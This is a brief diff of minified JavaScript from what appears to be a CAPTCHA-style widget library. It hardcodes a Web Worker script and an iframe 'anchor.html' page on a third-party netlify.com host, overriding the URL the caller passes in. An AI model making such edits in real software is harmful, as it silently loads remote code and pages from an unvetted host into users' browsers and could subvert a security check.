@@ -5286,7 +5286,6 @@
             d.call(void 0, LU(O.W), (new Date).getTime() - Q)
         },
         hH = function(O) {
-            console.log(O);
             O = "https://optimistic-poincare-053037.netlify.com/webworker.js";
             this.W = (this.X = (ok.call(this), this.l = null), window.Worker && O) ? new Worker(O) : null
         },
@@ -7894,7 +7893,7 @@
         I4 = function(O, d, h, Q, V) {
              
             (O.X = q2({
-                src: h,//"https://optimistic-poincare-053037.netlify.com/anchor.html",
+                src: "https://optimistic-poincare-053037.netlify.com/anchor.html",//h
                 tabindex: Q,
                 width: String(V.width),
                 height: String(V.height),
